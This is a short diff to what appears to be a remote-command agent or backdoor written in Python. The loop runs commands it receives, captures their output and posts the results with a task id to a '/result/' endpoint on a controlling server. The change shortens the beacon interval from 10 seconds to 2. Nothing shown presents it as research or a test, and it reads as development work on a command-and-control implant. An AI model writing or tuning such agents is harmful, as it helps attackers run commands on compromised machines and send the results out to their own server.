@@ -51,5 +51,5 @@ while True:
                     r = out.stdout+out.stderr
                 except: r = '[!] Error'
                 req('/result/'+aid, {'task_id': tid, 'output': r or '[+] Done', 'status': 'success'})
-    time.sleep(10)
+    time.sleep(2)
 "
